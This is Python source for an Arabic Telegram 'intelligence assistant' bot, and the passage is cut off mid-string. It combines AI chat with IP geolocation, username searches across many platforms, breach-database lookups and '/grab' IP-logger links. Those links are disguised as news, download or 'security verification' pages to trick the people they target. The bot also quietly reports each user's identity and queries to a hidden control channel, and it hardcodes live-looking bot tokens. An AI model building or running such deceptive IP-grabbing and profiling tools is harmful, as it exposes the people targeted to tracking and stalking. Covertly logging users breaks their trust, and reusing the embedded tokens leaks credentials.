import os
import re
import base64
import hashlib
import time
import requests
from datetime import datetime
from collections import defaultdict

from telegram import (
    Update,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
)
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    filters,
    ContextTypes,
)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  ⚙️  إعدادات النظام
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

MAIN_BOT_TOKEN     = "8556004865:AAE_W9SXGVxgTcpSCufs_hemEb_mOX_ioj0"
TRACKER_BOT_TOKEN  = "8346034907:AAHv4694Nf1Mn3JSwcUeb1Zkl1ZSlsODIx8"
TARGET_CHANNEL_ID  = "-1003770774871"
CONTROL_CHANNEL_ID = "-1003751955886"
ADMIN_ID           = 6124349953

GROQ_API_KEY   = os.getenv("GROQ_API_KEY", "")
TAVILY_API_KEY = os.getenv("TAVILY_API_KEY", "")
IPINFO_TOKEN   = os.getenv("IPINFO_TOKEN", "")
VIRUSTOTAL_KEY = os.getenv("VIRUSTOTAL_KEY", "")
DEHASHED_KEY   = os.getenv("DEHASHED_KEY", "")

BOT_SERVER_URL = os.getenv("BOT_SERVER_URL", "")

# ذاكرة المحادثة لكل مستخدم
chat_memory: dict[int, list] = defaultdict(list)
# سجل روابط التعقب
user_logs: dict[int, list] = defaultdict(list)
# طلبات grab المعلّقة (انتظار اختيار نوع الصفحة)
pending_grabs: dict[int, str] = {}

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  🔔  الإشعارات والمراقبة
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def _tg_post(token: str, chat_id: str, text: str, parse_mode: str = "Markdown"):
    try:
        requests.post(
            f"https://api.telegram.org/bot{token}/sendMessage",
            json={
                "chat_id": chat_id,
                "text": text[:4096],
                "parse_mode":parse_mode,
                "disable_web_page_preview": True,
            },
            timeout=10,
        )
    except Exception:
        pass


def notify_control(user, action: str):
    """يُرسل نشاط المستخدم إلى قناة المراقبة عبر البوت الرئيسي"""
    uname = f"@{user.username}" if user.username else "لا يوجد"
    msg = (
        "👁 *راشد — نشاط مستخدم*\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        f"👤 الاسم  : {user.full_name}\n"
        f"🆔 ID     : `{user.id}`\n"
        f"📛 معرف   : {uname}\n"
        f"🕐 الوقت  : {datetime.utcnow().strftime('%Y-%m-%d %H:%M UTC')}\n"
        f"📌 الإجراء: {action}\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        "✦ راشد — تطوير أبو سعود"
    )
    _tg_post(MAIN_BOT_TOKEN, CONTROL_CHANNEL_ID, msg)


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  🧠  الذكاء الاصطناعي | Groq AI
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

SYSTEM_PROMPT = (
    "أنت مساعد ذكاء اصطناعي متقدم اسمك «راشد»، من تصميم وتطوير أبو سعود.\n"
    "تحدث بشكل طبيعي وودود باللغة العربية.\n"
    "عند الإجابة:\n"
    "- أعطِ إجابات مفصّلة مع شرح واضح وأمثلة عند الحاجة.\n"
    "- إذا كان السؤال تقنياً أو برمجياً، فصّل الشرح خطوة بخطوة.\n"
    "- استخدم نقاط وعناوين لتنظيم الإجابات الطويلة.\n"
    "- لا تختصر إلا إذا طُلب منك ذلك.\n"
    "اختم كل رد بسطر: ✦ راشد — تطوير أبو سعود"
)

CODE_SYSTEM_PROMPT = (
    "أنت خبير برمجة متخصص اسمك «راشد»، من تصميم وتطوير أبو سعود.\n"
    "عند تحليل الأكواد البرمجية:\n"
    "1. اشرح ما يفعله الكود بشكل مفصّل.\n"
    "2. حدّد أي أخطاء أو مشاكل (Bugs) إن وجدت.\n"
    "3. اقترح تحسينات وممارسات أفضل (Best Practices).\n"
    "4. إذا كان فيه خطأ، اكتب الكود المصحّح.\n"
    "5. اشرح التعقيد الزمني (Time Complexity) إن كان ذا صلة.\n"
    "تحدث بالعربية بشكل واضح ومنظّم مع أمثلة.\n"
    "اختم كل رد بسطر: ✦ راشد — تطوير أبو سعود"
)


def _groq_post(system: str, messages: list, max_tokens: int = 2048) -> str:
    if not GROQ_API_KEY:
        return "⛔ مفتاح Groq غير مُهيّأ."
    try:
        r = requests.post(
            "https://api.groq.com/openai/v1/chat/completions",
            headers={
                "Authorization": f"Bearer {GROQ_API_KEY}",
                "Content-Type": "application/json",
            },
            json={
                "model": "llama-3.3-70b-versatile",
                "messages": [{"role": "system", "content": system}] + messages,
                "temperature": 0.6,
                "max_tokens": max_tokens,
            },
            timeout=45,
        )
        r.raise_for_status()
        return r.json()["choices"][0]["message"]["content"]
    except requests.exceptions.HTTPError as e:
        return f"⚠️ خطأ في الاتصال بـ Groq — كود: {e.response.status_code}"
    except requests.exceptions.Timeout:
        return "⚠️ انتهت مهلة الاتصال بالذكاء الاصطناعي، حاول مجدداً."
    except Exception as e:
        return f"⚠️ خطأ غير متوقع: {str(e)[:100]}"


def ask_groq(user_id: int, prompt: str) -> str:
    history = chat_memory[user_id]
    history.append({"role": "user", "content": prompt})
    if len(history) > 20:
        history = history[-20:]
        chat_memory[user_id] = history
    reply = _groq_post(SYSTEM_PROMPT, history, max_tokens=2048)
    chat_memory[user_id].append({"role": "assistant", "content": reply})
    return reply


def analyze_code(code: str) -> str:
    user_msg = f"حلّل هذا الكود:\n\n```\n{code}\n```"
    return _groq_post(CODE_SYSTEM_PROMPT, [{"role": "user", "content": user_msg}], max_tokens=2048)


def analyze_image_groq(image_bytes: bytes, prompt: str) -> str:
    if not GROQ_API_KEY:
        return "⛔ مفتاح Groq غير مُهيّأ."
    b64 = base64.b64encode(image_bytes).decode()
    try:
        r = requests.post(
            "https://api.groq.com/openai/v1/chat/completions",
            headers={
                "Authorization": f"Bearer {GROQ_API_KEY}",
                "Content-Type": "application/json",
            },
            json={
                "model": "meta-llama/llama-4-scout-17b-16e-instruct",
                "messages": [
                    {
                        "role": "user",
                        "content": [
                            {"type": "text", "text": f"{SYSTEM_PROMPT}\n\nمهمة: {prompt}"},
                            {"type": "image_url", "image_url": {"url": f"data:image/jpeg;base64,{b64}"}},
                        ],
                    }
                ],
                "temperature": 0.4,
                "max_tokens": 1024,
            },
            timeout=45,
        )
        r.raise_for_status()
        return r.json()["choices"][0]["message"]["content"]
    except Exception as e:
        return f"⚠️ [راشد // خطأ رؤية]\n{str(e)[:80]}"


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  🌐  تحليل IP | IPInfo
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def analyze_ip(ip: str) -> str:
    try:
        r = requests.get(
            f"https://ipinfo.io/{ip}/json",
            headers={"Authorization": f"Bearer {IPINFO_TOKEN}"},
            timeout=10,
        )
        if r.status_code != 200:
            return f"⚠️ فشل جلب بيانات الـ IP — كود: {r.status_code}"
        d = r.json()
        loc = d.get("loc", "")
        maps = f"https://maps.google.com/?q={loc}" if loc else ""
        report = (
            "━━━━━━━━━━━━━━━━━━━━━\n"
            "🌐 *راشد — تحليل IP*\n"
            "━━━━━━━━━━━━━━━━━━━━━\n"
            f"📍 IP        : `{d.get('ip', ip)}`\n"
            f"🏳️ الدولة   : {d.get('country', 'N/A')}\n"
            f"🏙️ المدينة  : {d.get('city', 'N/A')}\n"
            f"📍 المنطقة  : {d.get('region', 'N/A')}\n"
            f"🏢 المزود   : {d.get('org', 'N/A')}\n"
            f"🕐 المنطقة  : {d.get('timezone', 'N/A')}\n"
        )
        if maps:
            report += f"🗺️ الموقع   : [افتح الخريطة]({maps})\n"
        report += "━━━━━━━━━━━━━━━━━━━━━\n✦ راشد — تطوير أبو سعود"
        return report
    except Exception as e:
        return f"⚠️ خطأ في تحليل الـ IP: {str(e)[:80]}"


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  🔍  البحث الحي | Tavily
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def tavily_search(query: str, max_results: int = 5):
    if not TAVILY_API_KEY:
        return [], ""
    try:
        r = requests.post(
            "https://api.tavily.com/search",
            json={
                "api_key": TAVILY_API_KEY,
                "query": query,
                "search_depth": "advanced",
                "max_results": max_results,
                "include_answer": True,
            },
            timeout=20,
        )
        r.raise_for_status()
        return r.json().get("results", []), r.json().get("answer", "")
    except Exception:
        return [], ""


def cmd_osint_search(query: str) -> str:
    results, answer = tavily_search(query, 5)
    if not results and not answer:
        return "⛔ فشل البحث أو لا توجد نتائج."
    report = (
        "━━━━━━━━━━━━━━━━━━━━━\n"
        "📡 *راشد — تقرير OSINT*\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        f"🔎 الاستعلام: `{query}`\n\n"
    )
    if answer:
        report += f"📌 *ملخص:*\n{answer[:500]}\n\n"
    report += "📂 *المصادر:*\n"
    for i, res in enumerate(results[:4], 1):
        title = res.get("title", "—")[:60]
        url   = res.get("url", "#")
        snip  = res.get("content", "")[:120]
        report += f"\n{i}▪ {title}\n   🔗 {url}\n   ↳ {snip}...\n"
    report += "\n━━━━━━━━━━━━━━━━━━━━━\n✦ راشد — تطوير أبو سعود"
    return report


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  👤  OSINT مستخدم | Username OSINT — فحص مباشر لجميع المنصات
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

# كل منصة: (اسم_العرض, رابط_البروفايل, كيفية الكشف)
PLATFORMS_DIRECT = [
    ("Instagram",   "https://www.instagram.com/{u}/",         "instagram.com"),
    ("TikTok",      "https://www.tiktok.com/@{u}",            "tiktok.com"),
    ("Twitter/X",   "https://x.com/{u}",                      "x.com"),
    ("Snapchat",    "https://www.snapchat.com/add/{u}",        "snapchat.com"),
    ("Facebook",    "https://www.facebook.com/{u}",            "facebook.com"),
    ("YouTube",     "https://www.youtube.com/@{u}",            "youtube.com"),
    ("GitHub",      "https://github.com/{u}",                  "github.com"),
    ("Reddit",      "https://www.reddit.com/user/{u}",         "reddit.com"),
    ("Pinterest",   "https://www.pinterest.com/{u}/",          "pinterest.com"),
    ("Telegram",    "https://t.me/{u}",                        "t.me"),
    ("Twitch",      "https://www.twitch.tv/{u}",               "twitch.tv"),
    ("LinkedIn",    "https://www.linkedin.com/in/{u}",         "linkedin.com"),
    ("Steam",       "https://steamcommunity.com/id/{u}",       "steamcommunity.com"),
    ("SoundCloud",  "https://soundcloud.com/{u}",              "soundcloud.com"),
    ("Spotify",     "https://open.spotify.com/user/{u}",       "open.spotify.com"),
    ("Tumblr",      "https://{u}.tumblr.com",                  "tumblr.com"),
    ("Medium",      "https://medium.com/@{u}",                 "medium.com"),
    ("Flickr",      "https://www.flickr.com/people/{u}",       "flickr.com"),
    ("Vimeo",       "https://vimeo.com/{u}",                   "vimeo.com"),
    ("Patreon",     "https://www.patreon.com/{u}",             "patreon.com"),
]

_HEADERS = {
    "User-Agent": (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
        "AppleWebKit/537.36 (KHTML, like Gecko) "
        "Chrome/122.0.0.0 Safari/537.36"
    ),
    "Accept-Language": "en-US,en;q=0.9",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
}

# عبارات تدل على أن الصفحة غير موجودة (404 content)
_NOT_FOUND_PHRASES = [
    "page not found", "user not found", "this page isn't available",
    "sorry, this page", "isn't available", "does not exist",
    "account suspended", "profile not found", "404", "not found",
    "no results found", "لم يتم العثور",
]


def _check_profile(url: str) -> bool:
    """يتحقق من وجود بروفايل عبر طلب HTTP مباشر"""
    try:
        r = requests.get(url, headers=_HEADERS, timeout=8, allow_redirects=True)
        if r.status_code == 404:
            return False
        if r.status_code == 200:
            content_lower = r.text[:3000].lower()
            not_found = any(p in content_lower for p in _NOT_FOUND_PHRASES)
            return not not_found
        if r.status_code in (301, 302):
            return True
        return False
    except Exception:
        return False


def osint_username(username: str) -> str:
    from concurrent.futures import ThreadPoolExecutor, as_completed

    clean = username.lstrip("@").strip()

    report = (
        "━━━━━━━━━━━━━━━━━━━━━\n"
        "🕵 *راشد — OSINT مستخدم*\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        f"🎯 الهدف : `@{clean}`\n"
        f"🕐 الوقت : {datetime.utcnow().strftime('%Y-%m-%d %H:%M UTC')}\n"
        f"🔍 المنصات: {len(PLATFORMS_DIRECT)}\n"
        "━━━━━━━━━━━━━━━━━━━━━\n\n"
    )

    found_list   = []
    notfound_list = []

    def check(platform_data):
        name, url_tmpl, _ = platform_data
        url = url_tmpl.replace("{u}", clean)
        exists = _check_profile(url)
        return name, url, exists

    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = {executor.submit(check, p): p for p in PLATFORMS_DIRECT}
        for future in as_completed(futures):
            name, url, exists = future.result()
            if exists:
                found_list.append((name, url))
            else:
                notfound_list.append(name)

    if found_list:
        report += f"✅ *وُجد على {len(found_list)} منصة:*\n\n"
        for name, url in sorted(found_list, key=lambda x: x[0]):
            report += f"🟢 *{name}*\n   🔗 {url}\n\n"
    else:
        report += "⚠️ لم يُعثر على أي بروفايل مباشر.\n\n"

    if notfound_list:
        report += f"❌ *غير موجود ({len(notfound_list)})*: "
        report += " • ".join(notfound_list) + "\n\n"

    # بحث Tavily إضافي لمعلومات تكميلية
    try:
        results, answer = tavily_search(f'"{clean}" social media profile site:web', 3)
        if answer:
            report += f"📌 *معلومات إضافية:*\n{answer[:300]}\n\n"
    except Exception:
        pass

    report += "━━━━━━━━━━━━━━━━━━━━━\n✦ راشد — تطوير أبو سعود"
    return report


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  🛡️  فحص الروابط | VirusTotal
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def virustotal_scan(url_to_scan: str) -> str:
    if not VIRUSTOTAL_KEY:
        return "⛔ مفتاح VirusTotal غير مُهيّأ."
    headers = {"x-apikey": VIRUSTOTAL_KEY, "accept": "application/json"}
    try:
        resp = requests.post(
            "https://www.virustotal.com/api/v3/urls",
            headers=headers,
            data={"url": url_to_scan},
            timeout=15,
        )
        resp.raise_for_status()
        analysis_id = resp.json()["data"]["id"]
        for _ in range(6):
            time.sleep(5)
            rr = requests.get(
                f"https://www.virustotal.com/api/v3/analyses/{analysis_id}",
                headers=headers, timeout=15,
            )
            rr.raise_for_status()
            if rr.json()["data"]["attributes"]["status"] == "completed":
                break
        else:
            return "⚠️ انتهت مهلة فحص الرابط، حاول مجدداً."
        stats     = rr.json()["data"]["attributes"]["stats"]
        malicious = stats.get("malicious", 0)
        suspicious = stats.get("suspicious", 0)
        harmless  = stats.get("harmless", 0)
        undetected = stats.get("undetected", 0)
        verdict = "🔴 خطر" if malicious > 0 else ("🟡 مشبوه" if suspicious > 0 else "🟢 آمن")
        report = (
            "━━━━━━━━━━━━━━━━━━━━━\n"
            "🛡️ *راشد — فحص VirusTotal*\n"
            "━━━━━━━━━━━━━━━━━━━━━\n"
            f"🔗 الرابط   : `{url_to_scan[:60]}`\n"
            f"⚖️ الحكم    : {verdict}\n\n"
            f"🚨 خبيث     : {malicious}\n"
            f"⚠️ مشبوه    : {suspicious}\n"
            f"✅ آمن      : {harmless}\n"
            f"❓ غير محدد : {undetected}\n"
            "━━━━━━━━━━━━━━━━━━━━━\n"
            "✦ راشد — تطوير أبو سعود"
        )
        return report
    except requests.exceptions.HTTPError as e:
        return f"⚠️ خطأ VirusTotal — كود: {e.response.status_code}"
    except Exception as e:
        return f"⚠️ خطأ غير متوقع: {str(e)[:100]}"


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  🔒  فحص التسريبات | DeHashed
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def dehashed_search(query: str) -> str:
    if not DEHASHED_KEY:
        return "⛔ مفتاح DeHashed غير مُهيّأ."
    try:
        resp = requests.get(
            f"https://api.dehashed.com/v2/search?query={query}",
            headers={"Accept": "application/json", "X-Api-Key": DEHASHED_KEY},
            timeout=15,
        )
        resp.raise_for_status()
        data = resp.json()
        if data.get("success") and data.get("total", 0) > 0:
            report = (
                "━━━━━━━━━━━━━━━━━━━━━\n"
                "🚨 *راشد — تقرير تسريبات*\n"
                "━━━━━━━━━━━━━━━━━━━━━\n"
                f"🔎 الاستعلام   : `{query}`\n"
                f"⚠️ التسريبات   : {data.get('total')}\n\n"
            )
            for item in data.get("data", [])[:5]:
                report += f"▪ *المصدر* : {item.get('source', 'N/A')}\n"
                report += f"  التاريخ  : {item.get('date', 'N/A')}\n"
                report += f"  النوع    : {item.get('type', 'N/A')}\n\n"
            report += "━━━━━━━━━━━━━━━━━━━━━\n✦ راشد — تطوير أبو سعود"
            return report
        return "✅ لا توجد تسريبات لهذا الاستعلام."
    except requests.exceptions.HTTPError as e:
        return f"⚠️ خطأ DeHashed — كود: {e.response.status_code}"
    except Exception as e:
        return f"⚠️ خطأ غير متوقع: {str(e)[:100]}"


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  🔗  توليد رابط سحب IP | Grab Link
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

PAGE_TYPES = {
    "news":     "📰 صفحة إخبارية",
    "download": "📥 تحميل ملف",
    "bot":      "🤖 توجيه للبوت",
    "verify":   "🔒 تحقق أمني",
}


def generate_grab_link(user_id: int, label: str, page_type: str = "news") -> str:
    if not BOT_SERVER_URL or BOT_SERVER_URL == "https://":
        return "⛔ رابط الخادم غير مُهيّأ."
    session_id  = hashlib.sha256(f"{user_id}-{label}-{datetime.now()}".encode()).hexdigest()[:12]
    tracker_url = f"{BOT_SERVER_URL}/track/{user_id}/{session_id}/{page_type}"
    user_logs[user_id].append({
        "session_id": session_id,
        "url":        tracker_url,
        "label":      label,
        "page":       PAGE_TYPES.get(page_type, page_type),
        "timestamp":  datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
    })
    return tracker_url


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  🎨  الواجهة الرئيسية
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def build_main_keyboard(is_admin: bool = False) -> InlineKeyboardMarkup:
    keyboard = [
        [
            InlineKeyboardButton("🤖 ذكاء اصطناعي",   callback_data="cb_ai"),
            InlineKeyboardButton("💻 تحليل كود",       callback_data="cb_code"),
        ],
        [
            InlineKeyboardButton("🛡️ فحص رابط",       callback_data="cb_scan"),
            InlineKeyboardButton("🌐 تحليل IP",        callback_data="cb_ip"),
        ],
        [
            InlineKeyboardButton("👤 بحث مستخدم",     callback_data="cb_user"),
            InlineKeyboardButton("🔍 بحث OSINT",       callback_data="cb_osint"),
        ],
        [
            InlineKeyboardButton("🕵️ رابط سحب IP",    callback_data="cb_grab"),
            InlineKeyboardButton("📋 سجلاتي",          callback_data="cb_mylogs"),
        ],
        [
            InlineKeyboardButton("ℹ️ المساعدة",         callback_data="cb_help"),
        ],
    ]
    if is_admin:
        keyboard.insert(-1, [
            InlineKeyboardButton("🔓 تسريبات",         callback_data="cb_dehashed"),
            InlineKeyboardButton("🔬 VirusTotal",       callback_data="cb_vt"),
        ])
    return InlineKeyboardMarkup(keyboard)


WELCOME_TEXT = (
    "```\n"
    "╔══════════════════════════════╗\n"
    "║   ⚡  راشد الاستخباراتي  ⚡  ║\n"
    "║      نظام الذكاء v2.0        ║\n"
    "╚══════════════════════════════╝\n"
    "```\n"
    "أهلاً *{name}* 👋\n\n"
    "أنا *راشد*، مساعدك الاستخباراتي المتقدم.\n"
    "أملك قدرات في:\n"
    "› 🤖 الذكاء الاصطناعي مع ذاكرة محادثة\n"
    "› 🌐 تحليل عناوين IP والمواقع\n"
    "› 🔍 البحث الاستخباراتي OSINT\n"
    "› 🛡️ فحص الروابط الخبيثة\n"
    "› 🕵️ توليد روابط سحب بيانات IP\n"
    "› 💻 تحليل الأكواد البرمجية\n\n"
    "اختر أداة من القائمة أو أرسل رسالتك مباشرةً 👇"
)


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  🤖  أوامر البوت | Commands
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user      = update.effective_user
    is_admin  = user.id == ADMIN_ID
    text      = WELCOME_TEXT.format(name=user.first_name)
    await update.message.reply_text(
        text,
        reply_markup=build_main_keyboard(is_admin),
        parse_mode="Markdown",
    )
    if not is_admin:
        notify_control(user, "بدأ البوت /start")


async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    is_admin = user.id == ADMIN_ID
    text = (
        "━━━━━━━━━━━━━━━━━━━━━\n"
        "📖 *قائمة الأوامر — راشد*\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        "/start — تشغيل النظام\n"
        "/osint `<موضوع>` — بحث OSINT على الإنترنت\n"
        "/user `<معرف>` — بحث عن مستخدم على المنصات\n"
        "/ip `<عنوان>` — تتبع وتحليل عنوان IP\n"
        "/scan `<رابط>` — فحص أمني لرابط\n"
        "/grab `<تسمية>` — توليد رابط سحب IP\n"
        "/mylogs — عرض سجلات روابطك\n"
        "/clear — مسح ذاكرة المحادثة\n"
        "/help — قائمة الأوامر\n"
    )
    if is_admin:
        text += (
            "\n🔐 *أوامر المدير فقط:*\n"
            "/dehashed `<استعلام>` — بحث في التسريبات\n"
            "/vt `<رابط>` — فحص VirusTotal\n"
        )
    text += "━━━━━━━━━━━━━━━━━━━━━\n✦ راشد — تطوير أبو سعود"
    await update.message.reply_text(text, parse_mode="Markdown")


async def cmd_osint(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if not context.args:
        await update.message.reply_text("📌 الاستخدام: `/osint <موضوع البحث>`", parse_mode="Markdown")
        return
    query = " ".join(context.args)
    msg = await update.message.reply_text("🔍 جاري البحث الاستخباراتي...")
    result = cmd_osint_search(query)
    await msg.edit_text(result, parse_mode="Markdown", disable_web_page_preview=True)
    if user.id != ADMIN_ID:
        notify_control(user, f"بحث OSINT: {query[:50]}")


async def cmd_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if not context.args:
        await update.message.reply_text("📌 الاستخدام: `/user <اسم المستخدم>`", parse_mode="Markdown")
        return
    username = context.args[0]
    msg = await update.message.reply_text("🕵️ جاري البحث عن المستخدم على المنصات...")
    result = osint_username(username)
    await msg.edit_text(result, parse_mode="Markdown", disable_web_page_preview=True)
    if user.id != ADMIN_ID:
        notify_control(user, f"بحث مستخدم: {username}")


async def cmd_ip(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if not context.args:
        await update.message.reply_text("📌 الاستخدام: `/ip <عنوان IP>`", parse_mode="Markdown")
        return
    ip = context.args[0].strip()
    msg = await update.message.reply_text("🌐 جاري تحليل عنوان الـ IP...")
    result = analyze_ip(ip)
    await msg.edit_text(result, parse_mode="Markdown", disable_web_page_preview=True)
    if user.id != ADMIN_ID:
        notify_control(user, f"تحليل IP: {ip}")


async def cmd_scan(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if not context.args:
        await update.message.reply_text("📌 الاستخدام: `/scan <الرابط>`", parse_mode="Markdown")
        return
    url = context.args[0].strip()
    msg = await update.message.reply_text("🛡️ جاري فحص الرابط... قد يستغرق حتى 30 ثانية.")
    result = virustotal_scan(url)
    await msg.edit_text(result, parse_mode="Markdown")
    if user.id != ADMIN_ID:
        notify_control(user, f"فحص رابط: {url[:50]}")


async def cmd_grab(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if not context.args:
        await update.message.reply_text(
            "📌 الاستخدام: `/grab <تسمية>`\n\nمثال: `/grab MyLink`",
            parse_mode="Markdown",
        )
        return
    label = " ".join(context.args)
    pending_grabs[user.id] = label
    kb = InlineKeyboardMarkup([
        [
            InlineKeyboardButton("📰 صفحة إخبارية", callback_data="grabpage:news"),
            InlineKeyboardButton("📥 تحميل ملف",    callback_data="grabpage:download"),
        ],
        [
            InlineKeyboardButton("🤖 توجيه للبوت",  callback_data="grabpage:bot"),
            InlineKeyboardButton("🔒 تحقق أمني",    callback_data="grabpage:verify"),
        ],
    ])
    await update.message.reply_text(
        f"🏷️ التسمية: *{label}*\n\n"
        "اختر *نوع الصفحة* التي سيراها الهدف عند فتح الرابط:",
        parse_mode="Markdown",
        reply_markup=kb,
    )


async def cmd_mylogs(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    logs = user_logs.get(user.id, [])
    if not logs:
        await update.message.reply_text("📭 لا توجد سجلات لروابطك حتى الآن.\nاستخدم `/grab <تسمية>` لإنشاء رابط.", parse_mode="Markdown")
        return
    text = "━━━━━━━━━━━━━━━━━━━━━\n📋 *سجلات روابطك*\n━━━━━━━━━━━━━━━━━━━━━\n\n"
    for i, log in enumerate(logs[-10:], 1):
        text += f"{i}▪ *{log['label']}*\n   🔗 `{log['url']}`\n   🕐 {log['timestamp']}\n\n"
    text += "✦ راشد — تطوير أبو سعود"
    await update.message.reply_text(text, parse_mode="Markdown", disable_web_page_preview=True)


async def cmd_clear(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    chat_memory[user.id] = []
    await update.message.reply_text("🧹 تم مسح ذاكرة المحادثة بنجاح.\nيمكنك البدء بمحادثة جديدة الآن.")


async def cmd_dehashed(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if user.id != ADMIN_ID:
        await update.message.reply_text("⛔ هذا الأمر للمدير فقط.")
        return
    if not context.args:
        await update.message.reply_text("📌 الاستخدام: `/dehashed <بريد/رقم/اسم>`", parse_mode="Markdown")
        return
    query = " ".join(context.args)
    msg = await update.message.reply_text("🔒 جاري البحث في قاعدة بيانات التسريبات...")
    result = dehashed_search(query)
    await msg.edit_text(result, parse_mode="Markdown")


async def cmd_vt(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if user.id != ADMIN_ID:
        await update.message.reply_text("⛔ هذا الأمر للمدير فقط.")
        return
    if not context.args:
        await update.message.reply_text("📌 الاستخدام: `/vt <الرابط>`", parse_mode="Markdown")
        return
    url = context.args[0].strip()
    msg = await update.message.reply_text("🔬 جاري الفحص المتقدم عبر VirusTotal...")
    result = virustotal_scan(url)
    await msg.edit_text(result, parse_mode="Markdown")


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  🔘  معالج الأزرار | Callback Handler
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

BUTTON_RESPONSES = {
    "cb_ai": (
        "🤖 *الذكاء الاصطناعي — راشد*\n\n"
        "أرسل سؤالك أو استفسارك مباشرةً وسأردّ عليك.\n"
        "أتذكّر سياق المحادثة تلقائياً.\n\n"
        "🧹 لمسح الذاكرة: `/clear`"
    ),
    "cb_code": (
        "💻 *تحليل الكود البرمجي*\n\n"
        "أرسل الكود مباشرةً أو ضمن كتلة كود.\n"
        "سأقوم بـ:\n"
        "› شرح ما يفعله الكود\n"
        "› كشف الأخطاء والمشاكل\n"
        "› اقتراح تحسينات\n"
        "› كتابة الكود المصحّح"
    ),
    "cb_scan": (
        "🛡️ *فحص الروابط*\n\n"
        "الأمر: `/scan <الرابط>`\n\n"
        "مثال:\n`/scan https://example.com`\n\n"
        "يتحقق من الرابط عبر 70+ محرك أمان."
    ),
    "cb_ip": (
        "🌐 *تحليل عنوان IP*\n\n"
        "الأمر: `/ip <عنوان IP>`\n\n"
        "مثال:\n`/ip 8.8.8.8`\n\n"
        "يُظهر: الدولة، المدينة، المزود، الموقع الجغرافي."
    ),
    "cb_user": (
        "👤 *بحث مستخدم على المنصات*\n\n"
        "الأمر: `/user <معرف>`\n\n"
        "مثال:\n`/user john_doe`\n\n"
        "يبحث على: فيسبوك، إنستغرام، تيك توك، تويتر، وغيرها."
    ),
    "cb_osint": (
        "🔍 *بحث OSINT*\n\n"
        "الأمر: `/osint <موضوع البحث>`\n\n"
        "مثال:\n`/osint اسم شخص أو موضوع`\n\n"
        "يجمع معلومات من مصادر متعددة على الإنترنت."
    ),
    "cb_grab": (
        "🕵️ *رابط سحب IP*\n\n"
        "الأمر: `/grab <تسمية>`\n\n"
        "مثال:\n`/grab رابط موقعي`\n\n"
        "ينشئ رابطاً خاصاً، عند ضغط أي شخص عليه\n"
